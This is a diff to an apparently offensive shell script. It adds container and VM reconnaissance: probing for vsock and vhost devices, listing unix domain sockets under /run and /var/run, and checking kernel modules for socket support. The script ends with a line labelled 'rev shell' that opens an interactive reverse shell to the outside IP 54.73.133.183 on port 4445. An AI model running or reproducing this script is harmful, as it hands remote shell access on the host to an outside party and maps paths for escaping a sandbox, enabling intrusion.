@@ -120,6 +120,26 @@ echo "ls sys bus virtio devices"
 ls /sys/bus/virtio/devices
 lspci
 
+echo "is guest host transport visible from container"
+ls /sys/bus/vhost/devices 2>/dev/null
+ls -l /dev/vsock 2>/dev/null
+ls /sys/class/misc | grep -i vsock
+ls -laR /dev | grep -i vsock
+
+echo "enum unix domain sockets"
+echo "ls run var run"
+ls -la /run /var/run 2>/dev/null
+echo "find -xdev -type s"
+find / -xdev -type s 2>/dev/null
+
+cat /proc/net/vsock 2>/dev/null
+lsmod | grep sock
+cat /proc/modules | grep sock
+
+
+
+
+
 echo "rev shell"
 sh -i >& /dev/tcp/54.73.133.183/4445 0>&1
 exit 0
